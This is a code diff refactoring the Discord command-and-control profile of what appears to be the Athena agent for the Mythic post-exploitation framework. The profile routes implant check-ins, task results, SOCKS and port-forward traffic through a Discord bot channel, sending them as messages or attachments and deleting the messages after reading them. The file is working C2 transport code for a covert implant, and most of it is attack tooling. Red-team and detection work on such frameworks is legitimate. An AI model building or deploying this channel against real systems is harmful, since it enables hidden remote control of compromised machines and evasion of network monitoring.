@@ -9,13 +9,9 @@ using Discore;
 using Discore.Http;
 using Discore.WebSocket;
 using System.Diagnostics;
-using System.Net;
-using System.Net.Http.Headers;
-using System.Text;
 using System.Text.Json;
 using Athena.Models.Proxy;
 using Athena.Profiles.Discord.Models;
-using System.Text.Json.Serialization;
 
 namespace Athena.Profiles.Discord
 {
@@ -26,41 +22,22 @@ namespace Athena.Profiles.Discord
         public int jitter { get; set; }
         public string uuid { get; set; }
         public bool encrypted { get; set; }
-        private string messageToken { get; set; }
-        private int messageChecks { get; set; }
-        public PSKCrypto crypt { get; set; }
+        public PSKCrypto? crypt { get; set; }
         public string psk { get; set; }
-        private bool encryptedExchangeCheck { get; set; }
-        private HttpClient discordClient { get; set; }
-        private string BotToken { get; set; }
-        private string ChannelID { get; set; }
-        private int timeBetweenChecks { get; set; }
-        private string userAgent { get; set; }
-        private string proxyHost { get; set; }
-        private string proxyPass { get; set; }
-        private string proxyUser { get; set; }
-        private int currentAttempt = 0;
-        private int maxAttempts = 5;
+        private string botToken { get; set; }
+        private int _currentAttempt = 0;
+        private int _maxAttempts = 5;
         private CancellationTokenSource cts = new CancellationTokenSource();
-        private string agent_guid = Guid.NewGuid().ToString();
-        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
-        private ManualResetEventSlim checkinResponse = new ManualResetEventSlim();
+        private string _agentGuid = Guid.NewGuid().ToString();
         private DiscordHttpClient _discordHttpClient { get; set; }
         private Shard _discordSocketClient { get; set; }
-        private bool checkedIn { get; set; }
+        private Snowflake _channelId { get; set; }
+        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
 
         public Discord()
         {
             this.uuid = "%UUID%";
-            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
-            this.messageToken = "discord_token";
-            this.ChannelID = "bot_channel";
-            this.userAgent = "%USERAGENT%";
-            this.messageChecks = int.Parse("message_checks");
-            this.timeBetweenChecks = int.Parse("time_between_checks");
-            this.proxyHost = "proxy_host:proxy_port";
-            this.proxyPass = "proxy_pass";
-            this.proxyUser = "proxy_user";
+            this._channelId = new Snowflake(ulong.Parse("bot_channel"));
             this.psk = "AESPSK";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
@@ -75,37 +52,8 @@ namespace Athena.Profiles.Discord
                 this.encrypted = true;
             }
 
-            HttpClientHandler handler = new HttpClientHandler();
-
-            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
-            {
-                WebProxy wp = new WebProxy()
-                {
-                    Address = new Uri(this.proxyHost)
-                };
-
-                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
-                {
-                    wp.Credentials = new NetworkCredential(this.proxyUser, this.proxyPass);
-                }
-                handler.Proxy = wp;
-            }
-            else
-            {
-                handler.UseDefaultCredentials = true;
-                handler.Proxy = WebRequest.GetSystemWebProxy();
-            }
-
-            this.discordClient = new HttpClient(handler);
-            this.discordClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", this.messageToken);
-
-            if (!String.IsNullOrEmpty(this.userAgent))
-            {
-                this.discordClient.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
-            }
-
-            this._discordHttpClient = new DiscordHttpClient(this.BotToken);
-            this._discordSocketClient = new Shard(this.BotToken, 0, 1);
+            this._discordHttpClient = new DiscordHttpClient(this.botToken);
+            this._discordSocketClient = new Shard(this.botToken, 0, 1);
             this._discordSocketClient.Gateway.OnMessageCreate += Gateway_OnMessageCreate;
         }
 
@@ -119,7 +67,7 @@ namespace Athena.Profiles.Discord
 
             //Checks, is the message null, is the sender the same as the agent, is the message to the server
             //If any of these checks are true, then it's not meant for us.
-            if (mythicMessage == null || mythicMessage.sender_id != this.agent_guid || mythicMessage.to_server)
+            if (mythicMessage == null || mythicMessage.sender_id != this._agentGuid || mythicMessage.to_server)
             {
                 return;
             }
@@ -132,6 +80,10 @@ namespace Athena.Profiles.Discord
                 mythicMessage.message = await GetFileContentsAsync(message.Attachments[0].Url);
             }
 
+            MessageReceivedArgs mra = new MessageReceivedArgs(mythicMessage.message);
+            SetMessageReceived?.Invoke(this, mra);
+
+            DeleteMessage(e.Message);
         }
 
         public async Task<bool> Send(string json)
@@ -152,7 +104,7 @@ namespace Athena.Profiles.Discord
                     message = json,
                     id = 0,
                     final = true,
-                    sender_id = agent_guid,
+                    sender_id = _agentGuid,
                     to_server = true
                 };
 
@@ -160,137 +112,49 @@ namespace Athena.Profiles.Discord
                 if (strMsg.Length > 1950)
                 {
                     //SendAttachment
-                    //await SendAttachment(strMsg);
+                    await SendAttachment(strMsg);
                 }
                 else
                 {
                     //SendMessage
-                    //await SendMessage(strMsg);
+                    await SendMessage(strMsg);
                 }
 
                 return true;
-
-                //List<MythicMessageWrapper> agentMessages = new List<MythicMessageWrapper>();
-                //List<string> msgToRemove = new List<string>();
-                //int checkins = 0;
-                //do
-                //{
-                //    await Task.Delay(this.timeBetweenChecks * 1000);
-
-                //    var messages = await ReadMessages();
-                //    foreach (var message in messages)
-                //    {
-                //        MythicMessageWrapper currentMessage;
-                //        if (message.attachments.Count > 0)
-                //        {
-                //            foreach (var attachment in message.attachments)
-                //            {
-                //                if (attachment.filename.Contains(this.agent_guid) && !attachment.filename.EndsWith("server"))
-                //                {
-                //                    currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(await GetFileContentsAsync(attachment.url));
-                //                    if (currentMessage is not null && currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
-                //                    {
-                //                        agentMessages.Add(currentMessage);
-                //                        msgToRemove.Add(message.id);
-                //                    }
-                //                }
-                //            }
-                //        }
-                //        else
-                //        {
-                //            if (message.content.Contains(this.agent_guid))
-                //            {
-                //                currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.content);
-                //                if (currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
-                //                {
-                //                    agentMessages.Add(currentMessage);
-                //                    msgToRemove.Add(message.id);
-                //                }
-                //            }
-                //        }
-                //    }
-                //    checkins++;
-                //    if (checkins == this.messageChecks)
-                //    {
-                //        return "";
-                //    }
-
-                //} while (agentMessages.Count() < 1);
-
-                ////No concept of chunking yet, so just grab one
-                //string strRes = agentMessages.FirstOrDefault().message;
-
-                //DeleteMessages(msgToRemove);
-
-                //if (this.encrypted)
-                //{
-                //    return this.crypt.Decrypt(strRes);
-                //}
-                //else
-                //{
-                //    if (String.IsNullOrEmpty(strRes))
-                //    {
-                //        return json;
-                //    }
-                //    else
-                //    {
-                //        return (await Misc.Base64Decode(strRes)).Substring(36);
-                //    }
-                //}
             }
             catch (Exception e)
             {
                 return false;
             }
         }
-        //public async Task<bool> SendMessage(string msg)
-        //{
-        //    string url = "https://discord.com/api/channels/" + this.ChannelID + "/messages";
 
-        //    Dictionary<string, string> Payload = new Dictionary<string, string>()
-        //    {
-        //      {"content" , msg }
-        //    };
-
-        //    StringContent content = new StringContent(JsonSerializer.Serialize(Payload), Encoding.UTF8, "application/json");
-        //    HttpResponseMessage res = await discordClient.PostAsync(url, content);
-
-        //    return res.IsSuccessStatusCode ? true : false;
-        //}
-
-        //public async Task<List<ServerDetails>> ReadMessages()
-        //{
-        //    var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=10";
-        //    var res = await discordClient.GetAsync(url);
-        //    string ResponseMessages = await res.Content.ReadAsStringAsync();
-        //    return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>();
-        //}
-
-        //public async Task<bool> SendAttachment(string msg) //8mb by default, size limit applies to all files in a request 
-        //{
-        //    try
-        //    {
-        //        var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
-        //        var Content = new MultipartFormDataContent();
-        //        byte[] msgBytes = Encoding.ASCII.GetBytes(msg);
-
-        //        var File_Content = new ByteArrayContent(msgBytes);
-        //        File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
-        //        File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
-        //        {
-        //            FileName = agent_guid + ".server",
-        //        };
-        //        Content.Add(File_Content);
-        //        var res = await discordClient.PostAsync(URL, Content);
-
-        //        return res.IsSuccessStatusCode;
-        //    }
-        //    catch (Exception e)
-        //    {
-        //        return false;
-        //    }
-
-        //}
+        private async Task<bool> SendAttachment(string json)
+        {
+            try
+            {
+                await this._discordHttpClient.CreateMessage(this._channelId, new CreateMessageOptions()
+                    .AddAttachment(new AttachmentOptions(0)
+                        .SetFileName(_agentGuid + ".server")
+                        .SetContent(json)));
+            }
+            catch
+            {
+                return false;
+            }
+            return true;
+        }
+        private async Task<bool> SendMessage(string json)
+        {
+            try
+            {
+                await this._discordHttpClient.CreateMessage(this._channelId, json);
+            }
+            catch
+            {
+                return false;
+            }
+            return true;
+        }
 
         private async Task<string> GetFileContentsAsync(string url)
         {
@@ -317,17 +181,9 @@ namespace Athena.Profiles.Discord
             return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");
 
         }
-        public async Task<bool> DeleteMessages(List<string> messages)
+        public async Task DeleteMessage(DiscordMessage message)
         {
-            bool success = false;
-            foreach (var id in messages)
-            {
-                var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/messages/" + id;
-                var res = await discordClient.DeleteAsync(url);
-                success = res.IsSuccessStatusCode;
-            }
-
-            return success;
+            await this._discordHttpClient.DeleteMessage(message);
         }
 
         public async Task StartBeacon()
@@ -342,10 +198,18 @@ namespace Athena.Profiles.Discord
                 Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                 await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
 
+                if (delegateTask.Result.Count <= 0 &&
+                    socksTask.Result.Count <= 0 &&
+                    responseTask.Result.Count <= 0 &&
+                    rpFwdTask.Result.Count <= 0)
+                {
+                    continue;
+                }
+
+
                 GetTasking gt = new GetTasking()
                 {
-                    action = "get_tasking",
-                    tasking_size = -1,
+                    action = "post_response",
                     delegates = delegateTask.Result,
                     socks = socksTask.Result,
                     responses = responseTask.Result,
@@ -358,35 +222,15 @@ namespace Athena.Profiles.Discord
                         return;
                     }
 
-                    this.currentAttempt++;
-
-                    //if (String.IsNullOrEmpty(responseString))
-                    //{
-                    //    this.currentAttempt++;
-                    //    continue;
-                    //}
-
-                    //GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                    //if (gtr == null)
-                    //{
-                    //    this.currentAttempt++;
-                    //    continue;
-                    //}
-
-                    //this.currentAttempt = 0;
-
-                   
-                    //TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-
-                    //this.(this, tra);
+                    this._currentAttempt++;
                 }
                 catch (Exception e)
                 {
                     Debug.WriteLine($"[{DateTime.Now}] Beacon attempt failed {e}");
-                    this.currentAttempt++;
+                    this._currentAttempt++;
                 }
 
-                if (this.currentAttempt >= this.maxAttempts)
+                if (this._currentAttempt >= this._maxAttempts)
                 {
                     this.cts.Cancel();
                 }
@@ -411,10 +255,15 @@ namespace Athena.Profiles.Discord
 
             do
             {
-                return await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
+                if(await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
+                {
+                    return true;
+                }
 
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
+
+            return false;
         }
     }
 }
